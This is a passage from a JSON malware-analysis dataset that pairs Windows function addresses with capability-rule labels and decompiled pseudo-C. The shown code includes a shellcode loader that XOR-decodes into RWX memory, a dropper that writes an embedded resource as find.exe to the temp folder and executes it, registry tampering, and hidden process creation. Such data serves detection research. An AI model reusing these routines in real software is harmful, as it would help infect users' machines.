            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008f159(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint arg_10h;\n    uint lpflOldProtect;\n    \n    lpflOldProtect = param_1;\n    puVar1 = fcn.000810ad(0x800);\n    iVar2 = 0x601;\n    puVar5 = puVar1;\n    do {\n        *puVar5 = puVar5[0x93bf0 - puVar1] ^ 0x45;\n        puVar5 = puVar5 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(puVar1, 2000, 0x40, &lpflOldProtect);\n    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x1fe, 0x1000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(iVar3, 0x104);\n    arg_10h = 0x9452c;\n    iVar2 = iVar3;\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar3, 0x9452c, 0x28);\n    fcn.0008102c(iVar3 + iVar4 * 2, iVar2, arg_10h);\n    (*(puVar1 + 0xef))(iVar3, param_1, 0, 0);\n    return;\n}\n",
        "token_count": 369
    },
    "0008f25f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.0008f25f(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    fcn.00081052(0x968c0, 0, 0x208);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, 0x968c0, 0x208);\n    iVar1 = (*_sym.imp.SHELL32.dll_IsUserAnAdmin)();\n    if (iVar1 == 0) {\n        fcn.0008f1ec();\n        uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceW)(0, 0x66, 0x94554);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(0, uVar2);\n        (*_sym.imp.KERNEL32.dll_SizeofResource)(0, uVar2);\n        (*_sym.imp.KERNEL32.dll_LockResource)(uVar3);\n        fcn.0008f159();\n    }\n    return 0;\n}\n",
        "token_count": 225
    },
    "0008f3f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008f3f9(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    int32_t lpflOldProtect;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    lpflOldProtect = param_1;\n    var_4h = param_2;\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_2, 0x1000, 4);\n    puVar2 = (var_4h - 1) + param_1;\n    do {\n        *(uVar3 + iVar1) = ~*puVar2;\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + -1;\n    } while (uVar3 <= var_4h);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(iVar1, var_4h, 0x40, &lpflOldProtect);\n    return iVar1;\n}\n",
        "token_count": 245
    },
    "0008f56d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008f56d(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = 0;\n    if (arg_8h != 0) {\n        uVar1 = fcn.000859a9();\n        fcn.00085966(arg_8h + 2);\n        fcn.00085985(arg_8h);\n        uVar1 = fcn.000833ab(uVar1);\n        fcn.000831fd(uVar1);\n        fcn.000858fb();\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "0008f628": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.0008f628(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    char *arg_10h;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar1);\n    if (iVar2 != 0) {\n        if (var_4h == 0) {\n            iVar2 = fcn.0008f7cd();\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar3, 0x104);\n            arg_10h = \"\\\\System32\\\\cmd.exe\";\n            iVar2 = iVar3;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3, \"\\\\System32\\\\cmd.exe\", 0x14);\n            fcn.0008102c(iVar4 + iVar3, iVar2, arg_10h);\n            fcn.00081052(&var_60h, 0, 0x44);\n            var_14h = 0;\n            uStack20 = 0;\n            var_ch = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar3, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n            if (iVar2 == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        fcn.0008f6ed();\n    }\n    return;\n}\n",
        "token_count": 482
    },
    "0008f7cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate processes/f67bedfed7e245aa9b0908c198426ab8",
            "contain loop",
            "enumerate processes"
        ],
        "decompiled_code": "\nuint fcn.0008f7cd(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_128h;\n    uint var_120h;\n    uint var_104h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    fcn.00081052(&var_128h, 0, 0x128);\n    var_128h = 0x128;\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(uVar1, &var_128h);\n    while( true ) {\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n            return 0;\n        }\n        iVar2 = fcn.000810e6(&var_104h, 0x945f4);\n        if (iVar2 == 0) break;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(uVar1, &var_128h);\n    }\n    return var_120h;\n}\n",
        "token_count": 240
    },
    "0008fc39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008fc39(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00081000(arg_ch, 0x92390, 0x10);\n    if ((iVar1 != 0) && (iVar1 = fcn.00081000(arg_ch, 0x92350, 0x10),  iVar1 != 0)) {\n        return 0x80004002;\n    }\n    *arg_10h = arg_8h;\n    return 0;\n}\n",
        "token_count": 132
    },
    "0008fd0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008fd0b(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    arg_8h = arg_8h + 0x10;\n    iVar1 = fcn.00081000(arg_8h, 0x92400, 0x10);\n    if (iVar1 == 0) {\n        *(in_ECX + 4) = 0x10;\n    }\n    else {\n        iVar1 = fcn.00081000(arg_8h, 0x923f0, 0x10);\n        if (iVar1 == 0) {\n            *(in_ECX + 4) = 0x18;\n        }\n        else {\n            iVar1 = fcn.00081000(arg_8h, 0x923e0, 0x10);\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = 0x20;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "0008fd71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0008fd71(uint *param_1)\n\n{\n    *param_1 = 0x94660;\n    fcn.000858fb();\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[3], 0, 0x8000);\n    return;\n}\n",
        "token_count": 70
    },
    "0008fe4f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0008fe4f(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_d4h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint var_7ch;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uchar auStack72 [4];\n    uint var_40h;\n    uint var_3ch;\n    uint var_36h;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    var_8h = NULL;\n    var_ch = NULL;\n    piVar4 = NULL;\n    var_10h = NULL;\n    piVar3 = NULL;\n    var_14h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x92380, 0, 1, 0x94694, &var_14h);\n    if (var_14h != NULL) {\n        (***var_14h)(var_14h, 0x92360, &var_ch);\n        if (var_ch != NULL) {\n            (**(*var_ch + 4))(var_ch);\n            fcn.00090180();\n            if (var_8h == NULL) goto code_r0x0008ffd0;\n            (*pcVar1)(0x923d0, 0, 1, 0x94684, &var_10h);\n            if (var_10h != NULL) {\n                (**(*var_10h + 0xc))(var_10h, var_8h, L\"Source\");\n                (**(*var_10h + 0xc))(var_10h, var_ch, L\"Grabber\");\n                fcn.00081052(&var_8ch, 0, 0x48);\n                var_8ch = *0x92410;\n                uStack140 = *0x92414;\n                uStack136 = *0x92418;\n                uStack132 = *0x9241c;\n                var_7ch = *0x923f0;\n                uStack124 = *0x923f4;\n                var_74h = *0x923f8;\n                uStack116 = *0x923fc;\n                (**(*var_14h + 0x10))(var_14h, &var_8ch);\n                piVar4 = fcn.0008fd9d();\n                if (piVar4 != NULL) {\n                    piVar3 = fcn.0008fdb9();\n                    if (piVar3 != NULL) {\n                        iVar2 = (**(*var_10h + 0x2c))(var_10h, piVar4, piVar3);\n                        if (-1 < iVar2) {\n                            (**(*var_14h + 0x14))(var_14h, &var_d4h);\n                            fcn.0008102c(auStack72 + ((var_90h + 0x30) - var_90h) + -0x30, var_90h + 0x30, 0x28);\n                            fcn.0008fc00();\n                            fcn.0009023f(arg_8h, var_3ch, var_40h, var_36h);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (var_8h != NULL) {\n        (**(*var_8h + 8))(var_8h);\n        var_8h = NULL;\n    }\ncode_r0x0008ffd0:\n    if (var_ch != NULL) {\n        (**(*var_ch + 8))(var_ch);\n        var_ch = NULL;\n    }\n    if (var_10h != NULL) {\n        (**(*var_10h + 8))(var_10h);\n        var_10h = NULL;\n    }\n    if (var_14h != NULL) {\n        (**(*var_14h + 8))(var_14h);\n        var_14h = NULL;\n    }\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4);\n    }\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return;\n}\n",
        "token_count": 1050
    },
    "0009068b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0009068b(int32_t **arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    int32_t in_ECX;\n    \n    arg_8h_00 = **arg_8h;\n    arg_8h_01 = fcn.0008f56d(arg_8h_00);\n    fcn.000831fd(arg_8h_01);\n    fcn.000858fb();\n    *(in_ECX + 4) = *(*arg_8h + arg_8h_00 + 4);\n    return;\n}\n",
        "token_count": 139
    },
    "000906ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create or open file",
            "get common file path",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000906ec(uint *arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint var_c44h;\n    uint var_844h;\n    uint var_444h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = in_ECX + 4;\n    uVar3 = fcn.0008f56d(**arg_8h);\n    fcn.000831fd(uVar3);\n    fcn.000858fb();\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindResourceW)(0, 0x67, 0x946ac);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadResource)(0, uVar3);\n    uVar3 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, uVar3);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar4);\n    fcn.00081052(&var_444h, 0, 0x400);\n    fcn.00081052(&var_844h, 0, 0x400);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathA;\n    (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x400, &var_444h);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_444h, \"find.exe\");\n    (*pcVar1)(0x400, &var_844h);\n    (*pcVar2)(&var_844h, \"find.db\");\n    uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileA)(&var_444h, 0x10000000, 1, 0, 2, 0x84, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(uVar5, uVar4, uVar3, &var_8h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    fcn.00081052(&var_c44h, 0, 0x400);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_c44h, \"-w %ws -d C -f %s\", *var_4h, &var_844h);\n    var_34h = &var_444h;\n    var_44h = 0x3c;\n    var_30h = &var_c44h;\n    var_40h = 0x40;\n    _var_20h = 0;\n    _var_18h = 0;\n    _var_10h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExA)(&var_44h);\n    return;\n}\n",
        "token_count": 800
    },
    "00090898": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00090898(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint var_81ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00081052(&var_81ch, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x400, &var_81ch);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_81ch, 0x946ec);\n    arg_8h_00 = in_ECX + 4;\n    uVar1 = fcn.000833ab(&var_81ch);\n    fcn.000831fd(uVar1);\n    fcn.000858fb();\n    var_18h = 0;\n    var_1ch = 0x35;\n    _var_14h = ZEXT816(0);\n    uVar1 = arg_8h;\n    fcn.00083527(arg_8h_00);\n    fcn.0008343f(arg_8h_00);\n    fcn.0008342b(arg_8h_00, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 309
    },
    "00090a7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "create or open registry key",
            "create directory",
            "get common file path",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00090bad)\n\nuint fcn.00090a7c(void)\n\n{\n    uint uStack1380;\n    char *pcStack1376;\n    uint uStack1372;\n    int32_t iStack1368;\n    uchar *puStack1364;\n    uint uStack1360;\n    uint uStack1356;\n    char *pcStack1352;\n    uint uStack1348;\n    uint uStack1344;\n    uint uStack1340;\n    uint uStack1336;\n    uint uStack1332;\n    uchar *puStack1328;\n    uchar *puStack1324;\n    int32_t iStack1316;\n    uchar auStack1312 [4];\n    uint uStack1308;\n    uint uStack1300;\n    uchar auStack1224 [1220];\n    \n    uStack1308 = 10;\n    uStack1300 = 0;\n    puStack1324 = 0x90aa0;\n    fcn.00085647();\n    puStack1324 = 0x90aa9;\n    fcn.0008ef3c();\n    puStack1324 = 0x90aaf;\n    puStack1324 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    puStack1328 = 0x90ab5;\n    fcn.00081085();\n    puStack1324 = &stack0xfffffaec;\n    puStack1328 = &stack0xfffffae0;\n    uStack1332 = 0;\n    uStack1336 = 0xf003f;\n    uStack1340 = 0;\n    uStack1344 = 0;\n    uStack1348 = 0;\n    pcStack1352 = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\";\n    uStack1356 = 0x80000001;\n    uStack1360 = 0x90ad9;\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)();\n    uStack1360 = 4;\n    puStack1364 = &stack0xfffffac0;\n    iStack1368 = 4;\n    uStack1372 = 0;\n    pcStack1376 = \"MaxConnectionsPer1_0Server\";\n    uStack1380 = uStack1348;\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)();\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExA)();\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    fcn.0008549d();\n    fcn.0008edaa(&stack0xfffffaa0);\n    fcn.000849f9(&stack0xfffffa9c, &stack0xfffffae4);\n    fcn.00081052();\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)();\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(&stack0xfffffb38);\n    if (iStack1316 == 0) {\n        fcn.0008ec15(\"MaxConnectionsPerServer\", 4);\n    }\n    if (iStack1368 != 0) {\n        fcn.0008f628();\n    }\n    fcn.0008496d();\n    fcn.00084709();\n    fcn.0008ebb6();\n    fcn.0008566c();\n    return 0;\n}\n",
        "token_count": 742
    },
    "00090c39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00090c39(uint arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint var_224h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00081052(&var_224h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &var_224h);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_224h, L\"\\\\Microsoft Vision\\\\\");\n    fcn.00083230(&var_224h);\n    arg_8h_00 = &var_4h;\n    var_1ch = 0x3b;\n    var_18h = 0;\n    _var_14h = ZEXT816(0);\n    uVar1 = arg_8h;\n    fcn.00083527(arg_8h_00);\n    fcn.0008343f(arg_8h_00);\n    fcn.0008342b(arg_8h_00, uVar1);\n    fcn.000858fb();\n    return arg_8h;\n}\n",
        "token_count": 306
    },
    "00090ff6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00090ff6(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpString2;\n    uint lpString2_00;\n    uint lpString2_01;\n    uint arg_8h;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00082473();\n    fcn.00082473();\n    fcn.00082473();\n    fcn.00082473();\n    fcn.00082473();\n    *0x96ce8 = 0;\n    *0x96d04 = 0;\n    *0x96d20 = 0;\n    *0x96d3c = 0;\n    *0x96d58 = 0;\n    uVar1 = fcn.000810ad(0x14);\n    uVar2 = fcn.000810ad(0x14);\n    lpString2 = fcn.000810ad(0x14);\n    lpString2_00 = fcn.000810ad(0x14);\n    lpString2_01 = fcn.000810ad(0x14);\n    fcn.0008f373();\n    fcn.0008f373();\n    fcn.0008f373();\n    fcn.0008f373();\n    fcn.0008f373();\n    uVar1 = fcn.00083185(uVar1);\n    fcn.0008d8cd(uVar1);\n    fcn.000858fb();\n    uVar1 = extraout_ECX;\n    arg_8h = fcn.00083185(uVar2);\n    fcn.0008d8cd(arg_8h);\n    fcn.000858fb(arg_8h, uVar2, uVar1);\n    uVar1 = extraout_ECX_00;\n    uVar2 = fcn.00083185(lpString2);\n    fcn.0008d8cd(uVar2);\n    fcn.000858fb(uVar2, lpString2, uVar1);\n    uVar1 = extraout_ECX_01;\n    uVar2 = fcn.00083185(lpString2_00);\n    fcn.0008d8cd(uVar2);\n    fcn.000858fb(uVar2, lpString2_00, uVar1);\n    uVar1 = extraout_ECX_02;\n    uVar2 = fcn.00083185(lpString2_01);\n    fcn.0008d8cd(uVar2);\n    fcn.000858fb(uVar2, lpString2_01, uVar1);\n    return 0x96cd0;\n}\n",
        "token_count": 623
    },
    "000911d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000911d7(uint arg_8h)\n\n{\n    fcn.00082c65(&arg_8h);\n    fcn.00082dff();\n    return;\n}\n",
        "token_count": 44
    },
    "00081273": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081273(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY32;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x8128e;\n    fcn.000814d4();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.00081521(&stack0xffffffe0, arg_ch);\n            fcn.000813d3(arg_8h_00, arg_ch, uStackY32, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "000812ba": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000812ba(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x812d5;\n    fcn.00081683();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.000816d5(&stack0xffffffe4, arg_ch);\n            fcn.00081560(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00081301": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081301(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStack20 = 0x8131c;\n    fcn.00081815();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.00081862(&stack0xffffffd8, arg_ch);\n            fcn.00081716(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "00081348": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081348(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x81363;\n    fcn.00081996();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.000819e3(&stack0xffffffe4, arg_ch);\n            fcn.000818a3(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "00081fd6": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00081fd6(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStackY32 [12];\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x81ff1;\n    fcn.00082053();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.000820a7(&stack0xffffffe0, arg_ch);\n            fcn.00081f0e(arg_8h_00);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00083efe": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00083efe(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack56;\n    uint uStack52;\n    uchar auStack48 [16];\n    uchar auStack32 [28];\n    \n    uStack56 = 7;\n    arg_ch = 0;\n    uStack52 = 0;\n    auStack48 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.00081862(auStack32, arg_ch);\n            fcn.00083527(arg_8h_00);\n            fcn.000858fb();\n            iVar1 = fcn.00081862(auStack48 + 4, arg_ch);\n            fcn.00083506(*(iVar1 + 0x10));\n            fcn.000858fb();\n            iVar1 = fcn.00081862(&uStack56, arg_ch);\n            fcn.000834dd(*(iVar1 + 8), *(iVar1 + 0xc));\n            fcn.000858fb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0008343f(arg_8h);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 325
    },
    "00084007": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00084007(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uchar auStack56 [24];\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [16];\n    \n    uStack28 = 0;\n    uStack32 = 5;\n    arg_ch = 0;\n    auStack24 = ZEXT816(0);\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            arg_8h_00 = fcn.000819e3(auStack56, arg_ch);\n            fcn.00083527(arg_8h_00);\n            fcn.000858fb();\n            iVar1 = fcn.000819e3(auStack56, arg_ch);\n            fcn.00083506(*(iVar1 + 4));\n            fcn.000858fb();\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(in_ECX + 0xc));\n    }\n    fcn.0008343f(arg_8h);\n    fcn.0008342b();\n    return arg_8h;\n}\n",
        "token_count": 274
    },
    "000843e2": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
